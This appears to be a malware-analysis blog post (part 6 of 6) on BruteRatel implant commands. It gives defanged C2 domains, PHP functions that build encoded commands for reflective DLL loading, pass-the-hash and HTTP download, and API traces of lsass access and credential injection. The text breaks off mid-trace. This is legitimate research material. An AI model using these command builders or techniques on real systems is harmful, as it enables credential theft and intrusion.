---
title: "BruteRatel full command analysis (6/6)"
date: 2025-04-26 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 6 

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the 6th and last part of my full analysis of BruteRatel commands :  
[Previous Part](https://cedricg-mirror.github.io/2025/04/12/BruteRatel5.html)  
[Full list](https://cedricg-mirror.github.io/2025/03/24/BruteRatelCommandList.html)  

I will be presenting in this post the last 9 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the last 9 commands codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
|"\x8C\xED"    | [ReflectiveDllLoading](#ReflectiveDllLoading) | $dll |
|"\x8X\x9D"    | [ReflectiveDllLoading2](#ReflectiveDllLoading2) | $dll |
|"\x3B\x2D"    | [SekurLsaPTH](#SekurLsaPTH) | $unknown, $domain, $user_name, $ntlm_hash, $command_line |
|"\x9C\xE2"    | [HttpGet](#HttpGet) | $opt, $ServerName, $port, $ObjectName |
|"\x2B\xEF"    | [GetFileSecurity](#GetFileSecurity) | $file_name |
|"\xB3\xD1"    | [GlobalStructControl17](#GlobalStructControl17) | $code, $value |
|"\xE2\xF1"    | [GlobalStructFree10](#GlobalStructFree10) | $code |
|"\xA9\xC3"    | [GlobalStructControl15](#GlobalStructControl15) | $code, $value |
|"\x41\x9D"    | [record_screen_jpg](#record_screen_jpg) | $p1, $duration |


<a id="ReflectiveDllLoading"></a>
# ReflectiveDllLoading    

This function can be instrumented at least in two different ways :  
- by sending a base64 encoded DLL to the malware, it will be directly loaded in memory and its header wiped  
- by setting the path through a previous call to GlobalStructControl15 to a DLL  already present on the infected system
  In that case, the DLL will be loaded by a Pool Worker Thread

I haven't however been able to make any of thoses methods work for now..


```php
function reflective_load($dll)
{
	$file = file_get_contents($dll);
	
	$dll_b64 = base64_encode($file);
	$cmd_id = "\x8c\xed $dll_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

<a id="ReflectiveDllLoading2"></a>
# ReflectiveDllLoading2    

Same as above with just a difference related to pipes which I haven't investigated yet


<a id="SekurLsaPTH"></a>
# SekurLsaPTH    

This function is an implementation of Mimikatz sekurlsa::pth  

```php
// ex : SekurLsaPTH("azerty", "mylab.local", "Eglantine", "fe67ba01dfde6e658294d48f954de392", "notepad");
function SekurLsaPTH($p1, $domain, $user_name, $ntlm_hash, $command_line)
{

	$cmd_id = "\x3b\x2d $p1 $domain $user_name $ntlm_hash $command_line";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [298]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000060D09616E0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W/KlSMcALhTY+QT+N0oet1EJcDYnjOXSHNz4IDoMN526Yi7QiYZuboylWNiRH66DLIgP/qq8YMgPb9TrLor6Pa0pEucQQTrE"
[STR]            "wU5s7Et6k1uCW39QNEpcwnxqMZTdxOpU75h9xXWA3CXBtuCEL0BgzeFpuAEbnVKOGVpXh+lEePV4hQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000060D0964F10
[PAR] DWORD   *pcbBinary : 0x00000060D298E5BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x60d28ebea1]
```

**II. Execution**   

```html
[CNT] [319]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <RtlGetNtVersionNumbers> in [ntdll.dll] 
[INF] [ Undocumented Function ]
[PAR] DWORD* MajorVersion : 0x00000060D298E32C
[PAR] DWORD* MinorVersion : 0x00000060D298E330
[PAR] DWORD* BuildNumber  : 0x00000060D298E3F0
[RET] [0x60d28f91d7]

[CNT] [320]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <RtlAdjustPrivilege> in [ntdll.dll] 
[PAR] ULONG    Privilege  : 0x14
[PAR] BOOLEAN  Enable     : 0x1
[PAR] BOOLEAN  Client     : 0x0
[PAR] PBOOLEAN WasEnabled : 0x00000060D298E28C
[RET] [0x60d28e9a5c]

[CNT] [331]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <CreateProcessWithLogonW> in [ADVAPI32.dll] 
[PAR] LPCWSTR               lpUsername           : 0x00000060D097D9D0
[STR]                       -> "Eglantine"
[PAR] LPCWSTR               lpDomain             : 0x00000060D097D890
[STR]                       -> "mylab.local"
[PAR] LPCWSTR               lpPassword           : 0x0 (null)
[PAR] DWORD                 dwLogonFlags         : 0x2 (LOGON_NETCREDENTIALS_ONLY)
[PAR] LPCWSTR               lpApplicationName    : 0x0 (null)
[PAR] LPWSTR                lpCommandLine        : 0x00000060D097D650
[STR]                       -> "notepad"
[PAR] DWORD                 dwCreationFlags      : 0x14 (CREATE_NEW_CONSOLE | CREATE_SUSPENDED)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCWSTR               lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x00000060D298E468
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000060D298E388
[RET] [0x60d28f9371]

[CNT] [332]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x380
[PAR] ACCESS_MASK DesiredAccess : 0x2000a (READ_CONTROL | TOKEN_DUPLICATE | TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x00000060D298E368
[RET] [0x60d2904b2f]

[CNT] [333]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x33c
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0xa(TokenStatistics)
[PAR] LPVOID                  TokenInformation       : 0x00000060D298E430
[PAR] DWORD                   TokenInformationLength : 0x38
[PAR] PDWORD                  ReturnLength           : 0x00000060D298E334
[RET] [0x60d28f93d0]

[CNT] [334]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
[PAR] DWORD th32ProcessID : 0x0
[RET] [0x60d28eed24]

[CNT] [335]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <Process32FirstW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x388
[PAR] LPPROCESSENTRY32W lppe      : 0x00000060D298DCE8
[RET] [0x60d28eed43]

[CNT] [336]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <Process32NextW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x388
[PAR] LPPROCESSENTRY32W lppe      : 0x00000060D298DCE8
[RET] [0x60d28eed53]

[ * ] [pid 0xc18][tid 0x56c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x00000060D298DCE8
[FLD]                   -> th32ProcessID = 0x4
[FLD]                   -> szExeFile     = "System"
[RES] BOOL 0x1

[...]

[CNT] [343]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <Process32NextW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x388
[PAR] LPPROCESSENTRY32W lppe      : 0x00000060D298DCE8
[RET] [0x60d28eed53]

[ * ] [pid 0xc18][tid 0x56c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x00000060D298DCE8
[FLD]                   -> th32ProcessID = 0x1ec
[FLD]                   -> szExeFile     = "lsass.exe"
[RES] BOOL 0x1

[CNT] [344]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x00000060D298E3E0
[PAR] ACCESS_MASK         DesiredAccess    : 0x1038 (PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x00000060D298E060
[PAR] PCLIENT_ID          ClientId         : 0x00000060D298E020
[FLD]                    -> UniqueProcess = 0x1ec ("c:\windows\system32\lsass.exe")
[FLD]                    -> UniqueThread  = 0x0
[RET] [0x60d2904aab]

[CNT] [345]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptOpenAlgorithmProvider> in [bcrypt.dll] 
[PAR] BCRYPT_ALG_HANDLE* phAlgorithm       : 0x00000060D298E3A0
[PAR] LPCWSTR            pszAlgId          : 0x00000060D097D670
[STR]                    -> "3DES"
[PAR] LPCWSTR            pszImplementation : 0x0 (null)
[PAR] ULONG              dwFlags           : 0x0
[RET] [0x60d28d3512]

[CNT] [346]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptSetProperty> in [bcrypt.dll] 
[PAR] BCRYPT_HANDLE hObject     : 0x00000060D0982220
[PAR] LPCWSTR       pszProperty : 0x00000060D0933040
[STR]               -> "ChainingMode"
[PAR] PUCHAR        pbInput     : 0x00000060D0933220
[PAR] ULONG         cbInput     : 0xf
[PAR] ULONG         dwFlags     : 0x0
[RET] [0x60d28d3547]

[CNT] [347]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptGetProperty> in [bcrypt.dll] 
[PAR] BCRYPT_HANDLE hObject     : 0x00000060D0982220
[PAR] LPCWSTR       pszProperty : 0x00000060D09331F0
[STR]               -> "ObjectLength"
[PAR] PUCHAR        pbOutput    : 0x00000060D298E3B8
[PAR] ULONG         cbOutput    : 0x4
[PAR] ULONG*        pcbResult   : 0x00000060D298DECC
[PAR] ULONG         dwFlags     : 0x0
[RET] [0x60d28d357b]

[CNT] [348]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptOpenAlgorithmProvider> in [bcrypt.dll] 
[PAR] BCRYPT_ALG_HANDLE* phAlgorithm       : 0x00000060D298E3C0
[PAR] LPCWSTR            pszAlgId          : 0x00000060D096EBB0
[STR]                    -> "AES"
[PAR] LPCWSTR            pszImplementation : 0x0 (null)
[PAR] ULONG              dwFlags           : 0x0
[RET] [0x60d28d35ab]

[CNT] [349]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptSetProperty> in [bcrypt.dll] 
[PAR] BCRYPT_HANDLE hObject     : 0x00000060D09838A0
[PAR] LPCWSTR       pszProperty : 0x00000060D0933040
[STR]               -> "ChainingMode"
[PAR] PUCHAR        pbInput     : 0x00000060D0932D10
[PAR] ULONG         cbInput     : 0xf
[PAR] ULONG         dwFlags     : 0x0
[RET] [0x60d28d35dc]

[CNT] [350]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptGetProperty> in [bcrypt.dll] 
[PAR] BCRYPT_HANDLE hObject     : 0x00000060D09838A0
[PAR] LPCWSTR       pszProperty : 0x00000060D09331F0
[STR]               -> "ObjectLength"
[PAR] PUCHAR        pbOutput    : 0x00000060D298E3D8
[PAR] ULONG         cbOutput    : 0x4
[PAR] ULONG*        pcbResult   : 0x00000060D298DECC
[PAR] ULONG         dwFlags     : 0x0
[RET] [0x60d28d3607]

[CNT] [351]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <NtQueryInformationProcess> in [ntdll.dll] 
[PAR] HANDLE           ProcessHandle            : 0x388
[PAR] PROCESSINFOCLASS ProcessInformationClass  : 0x0 (ProcessBasicInformation)
[PAR] PVOID            ProcessInformation       : 0x00000060D298D940
[PAR] ULONG            ProcessInformationLength : 0x30
[PAR] PULONG           ReturnLength             : 0x00000060D298D91C
[RET] [0x60d28d27a3]

[CNT] [352]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <_wcsicmp> in [msvcrt.dll] 
[PAR] wchar_t *string1 : 0x00000060D097D9F0
[STR]         -> "lsasrv.dll"
[PAR] wchar_t *string2 : 0x00000060D097DAF0
[STR]         -> "lsass.exe"
[RET] [0x60d28d289d]

[CNT] [353]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <_wcsicmp> in [msvcrt.dll] 
[PAR] wchar_t *string1 : 0x00000060D09333D0
[STR]         -> "kerberos.dll"
[PAR] wchar_t *string2 : 0x00000060D097DAF0
[STR]         -> "lsass.exe"
[RET] [0x60d28d28cf]

[CNT] [354]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <_wcsicmp> in [msvcrt.dll] 
[PAR] wchar_t *string1 : 0x00000060D097D9F0
[STR]         -> "lsasrv.dll"
[PAR] wchar_t *string2 : 0x00000060D097D970
[STR]         -> "ntdll.dll"
[RET] [0x60d28d289d]

[CNT] [355]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <_wcsicmp> in [msvcrt.dll] 
[PAR] wchar_t *string1 : 0x00000060D09333D0
[STR]         -> "kerberos.dll"
[PAR] wchar_t *string2 : 0x00000060D097D970
[STR]         -> "ntdll.dll"
[RET] [0x60d28d28cf]

[...]

[CNT] [372]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptGenerateSymmetricKey> in [bcrypt.dll] 
[PAR] BCRYPT_ALG_HANDLE  hAlgorithm  : 0x00000060D0982220
[PAR] BCRYPT_KEY_HANDLE* phKey       : 0x00000060D298E3A8
[PAR] PUCHAR             pbKeyObject : 0x00000060D0969570
[PAR] ULONG              cbKeyObject : 0x22e
[PAR] PUCHAR             pbSecret    : 0x00000060D097D930
[PAR] ULONG              cbSecret    : 0x18
[PAR] ULONG              dwFlags     : 0x0
[RET] [0x60d28d1430]

[CNT] [373]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptGenerateSymmetricKey> in [bcrypt.dll] 
[PAR] BCRYPT_ALG_HANDLE  hAlgorithm  : 0x00000060D09838A0
[PAR] BCRYPT_KEY_HANDLE* phKey       : 0x00000060D298E3C8
[PAR] PUCHAR             pbKeyObject : 0x00000060D0932280
[PAR] ULONG              cbKeyObject : 0x28e
[PAR] PUCHAR             pbSecret    : 0x00000060D097D6B0
[PAR] ULONG              cbSecret    : 0x10
[PAR] ULONG              dwFlags     : 0x0
[RET] [0x60d28d1430]

[CNT] [374]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <RtlEqualString> in [ntdll.dll] 
[PAR] STRING  String1         : 0x00000060D096E970
[STR]         -> "Primary"
[PAR] STRING  String2         : 0x00000060D096E960
[STR]         -> "Primary"
[PAR] BOOLEAN CaseInSensitive : 0
[RET] [0x60d28d38b1]

[CNT] [375]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptDecrypt> in [bcrypt.dll] 
[PAR] BCRYPT_KEY_HANDLE hKey         : 0x00000060D0969570
[PAR] PUCHAR            pbInput      : 0x00000060D09646F0
[PAR] ULONG             cbInput      : 0x88
[PAR] VOID*             pPaddingInfo : 0x0
[PAR] PUCHAR            pbIV         : 0x00000060D298DCB0
[PAR] ULONG             cbIV         : 0x8
[PAR] PUCHAR            pbOutput     : 0x00000060D09646F0
[PAR] ULONG             cbOutput     : 0x88
[PAR] ULONG*            pcbResult    : 0x00000060D298DCAC
[PAR] ULONG             dwFlags      : 0x0
[RET] [0x60d28d3371]

[CNT] [376]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptEncrypt> in [bcrypt.dll] 
[PAR] BCRYPT_KEY_HANDLE hKey         : 0x00000060D0969570
[PAR] PUCHAR            pbInput      : 0x00000060D09646F0
[PAR] ULONG             cbInput      : 0x88
[PAR] VOID*             pPaddingInfo : 0x0
[PAR] PUCHAR            pbIV         : 0x00000060D298DCB0
[PAR] ULONG             cbIV         : 0x8
[PAR] PUCHAR            pbOutput     : 0x00000060D09646F0
[PAR] ULONG             cbOutput     : 0x88
[PAR] ULONG*            pcbResult    : 0x00000060D298DCAC
[PAR] ULONG             dwFlags      : 0x0
[RET] [0x60d28d3371]

[CNT] [377]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtWriteVirtualMemory> in [ntdll.dll] 
[PAR] HANDLE ProcessHandle        : 0x388
[PAR] PVOID  BaseAddress          : 0x000000262BBCC8E0
[PAR] PVOID  Buffer               : 0x00000060D09646F0
[PAR] ULONG  NumberOfBytesToWrite : 0x88
[RET] [0x60d290568c]

[...]

[CNT] [407]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtResumeThread> in [ntdll.dll] 
[PAR] HANDLE ThreadHandle : 0x384
[RET] [0x60d28f9563]

[CNT] [408]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptCloseAlgorithmProvider> in [bcrypt.dll] 
[PAR] BCRYPT_ALG_HANDLE hAlgorithm : 0x00000060D0982220
[PAR] ULONG             dwFlags    : 0x0
[RET] [0x60d28d328c]

[CNT] [409]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <BCryptDestroyKey> in [bcrypt.dll] 
[PAR] BCRYPT_KEY_HANDLE hKey : 0x00000060D0969570
[RET] [0x60d28d329b]
```

**III. Result**   

```html
[CNT] [413]
[PTP] [0xc18] [0x56c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000060D0933100
[STR]        -> "3B2D"
[STR]           "AA 1904"
[PAR] DWORD  cbBinary   : 0x18
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000060D097FB70
[PAR] DWORD* pcchString : 0x00000060D298E21C
[RET] [0x60d28ee028]
```

<a id="HttpGet"></a>
# HttpGet    

Download a resource through HTTP GET and reports its content to the C2  
In this example, the downloaded 'cmd1' file only contained the string "coucou"  


```php
/*
	As far as I can tell, $opt can be '0' or '1' but doesn't seem to be used
	ex: http_get("0", "tiguanin.com", "80", "/cmd1");
*/
function http_get($opt, $ServerName, $port, $ObjectName)
{
	$cmd_id = "\x9c\xe2 $opt $ServerName $port $ObjectName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [329]
[PTP] [0xfac] [0x898] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000CFD1A94020
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+esTcSNMLHEjawDL6J1oa8lEnAzUJ063DCqr/ND97L4eCYS2YweFvdqGRV9+KPLrxSNhmqYqGRcIYQsCuOZ+eMc5NGqU9Ow=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000CFD1A8BA80
[PAR] DWORD   *pcbBinary : 0x000000CFD3AAED0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xcfd3a0bea1]
```

**II. Execution**   

```html
[CNT] [367]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetOpenW> in [wininet.dll] 
[PAR] LPCWSTR lpszAgent       : 0x000000CFD1A7C8A0
[STR]         -> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
[PAR] DWORD   dwFlags         : 0x0 
[RET] [0xcfd39fac13]

[CNT] [368]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetConnectW> in [wininet.dll] 
[PAR] HINTERNET     hInternet      : 0xcc0004
[PAR] LPCWSTR       lpszServerName : 0x000000CFD1AB5540 ("tiguanin.com")
[PAR] INTERNET_PORT nServerPort    : 80
[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
[PAR] DWORD         dwFlags        : 0x0 
[RET] [0xcfd39fac54]

[CNT] [369]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <HttpOpenRequestW> in [wininet.dll] 
[PAR] HINTERNET hConnect           : 0xcc0008
[PAR] LPCWSTR   lpszVerb           : 0x000000CFD3A28E60 ("GET")
[PAR] LPCWSTR   lpszObjectName     : 0x000000CFD1AA2A10
[STR]           -> "/cmd1"
[PAR] LPCWSTR   lpszVersion        : 0x0 (null)
[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
[PAR] DWORD     dwFlags            : 0x84c80300 (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE)
[RET] [0xcfd39faca9]

[CNT] [370]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetSetOptionW> in [wininet.dll] 
[PAR] HINTERNET hInternet      : 0xcc000c
[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
[PAR] LPVOID    lpBuffer       : 0x000000CFD402EE0C
[PAR] DWORD     dwBufferLength : 0x4
[RET] [0xcfd39fad2d]

[CNT] [371]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <HttpSendRequestA> in [wininet.dll] 
[PAR] HINTERNET hRequest         : 0xcc000c
[PAR] LPCTSTR   lpszHeaders      : 0x0 (null)
[PAR] DWORD     dwHeadersLength  : 0x0
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[RET] [0xcfd39fad4e]

[CNT] [372]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetQueryDataAvailable> in [wininet.dll] 
[PAR] HINTERNET hFile                    : 0xcc000c
[PAR] LPCVOID   lpBuffer                 : 0x000000CFD402EE10
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
[RET] [0xcfd39fad8d]

[CNT] [373]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetReadFile> in [wininet.dll] 
[PAR] HINTERNET hFile                 : 0xcc000c
[PAR] LPVOID    lpBuffer              : 0x000000CFD1AC0510
[PAR] DWORD     dwNumberOfBytesToRead : 0x6
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000CFD402EE14
[RET] [0xcfd39fadac]

[CNT] [374]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <InternetQueryDataAvailable> in [wininet.dll] 
[PAR] HINTERNET hFile                    : 0xcc000c
[PAR] LPCVOID   lpBuffer                 : 0x000000CFD402EE10
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
[RET] [0xcfd39fad8d]


```

**III. Result**   

```html
[CNT] [378]
[PTP] [0xfac] [0xf54] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000CFD1A7C040
[STR]        -> "9CE2"
[STR]           "coucou"
[PAR] DWORD  cbBinary   : 0x16
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000CFD1A92550
[PAR] DWORD* pcchString : 0x000000CFD402EDDC
[RET] [0xcfd3a0e028]
```

<a id="GetFileSecurity"></a>
# GetFileSecurity    

```php
// get_file_security("autorunsc64.exe");
function get_file_security($file_name)
{
	$file_16le = UConverter::transcode($file_name, 'UTF-16LE', 'UTF-8');
	$b64_file = base64_encode($file_16le);
	$cmd_id = "\x2b\xef $b64_file";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [432]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000BD57D7E9D0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+X6CtSMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEebzkWP7OYZUKFrgfcSa1"
[STR]            "szQZ+WhDtleVZXMSNGIjijJ5Io/dvg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000BD57D7FAA0
[PAR] DWORD   *pcbBinary : 0x000000BD59C2E59C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xbd59b8bea1]
```

**II. Execution**   

```html
[CNT] [449]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x000000BD57D8E5A0
[STR]         -> "autorunsc64.exe"
[PAR] DWORD   nBufferLength : 0x104
[PAR] LPWSTR  lpBuffer      : 0x000000BD59C2E2A8
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] [0xbd59b89213]

[CNT] [460]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetFileSecurityW> in [ADVAPI32.dll] 
[PAR] LPCWSTR              lpFileName           : 0x000000BD59C2E2A8
[STR]                      -> "C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] SECURITY_INFORMATION RequestedInformation : 0x4 (DACL_SECURITY_INFORMATION)
[PAR] PSECURITY_DESCRIPTOR pSecurityDescriptor  : 0x0
[PAR] DWORD                nLength              : 0x0
[PAR] LPDWORD              lpnLengthNeeded      : 0x000000BD59C2E174
[RET] [0xbd59b8928d]

[CNT] [461]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetFileSecurityW> in [ADVAPI32.dll] 
[PAR] LPCWSTR              lpFileName           : 0x000000BD59C2E2A8
[STR]                      -> "C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] SECURITY_INFORMATION RequestedInformation : 0x4 (DACL_SECURITY_INFORMATION)
[PAR] PSECURITY_DESCRIPTOR pSecurityDescriptor  : 0x000000BD57D80020
[PAR] DWORD                nLength              : 0x6c
[PAR] LPDWORD              lpnLengthNeeded      : 0x000000BD59C2E174
[RET] [0xbd59b892c8]

[CNT] [462]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetSecurityDescriptorDacl> in [ADVAPI32.dll] 
[PAR] PSECURITY_DESCRIPTOR pSecurityDescriptor : 0x000000BD57D80020
[PAR] LPBOOL               lpbDaclPresent      : 0x000000BD59C2E178
[PAR] PACL*                pDacl               : 0x000000BD59C2E1A8
[PAR] LPBOOL               lpbDaclDefaulted    : 0x000000BD59C2E17C
[RET] [0xbd59b892f0]

[CNT] [463]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetAce> in [ADVAPI32.dll] 
[PAR] PACL    pAcl       : 0x000000BD57D80034
[PAR] DWORD   dwAceIndex : 0x0
[PAR] LPVOID* pAce       : 0x000000BD59C2E1B0
[RET] [0xbd59b89342]

[CNT] [464]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80044
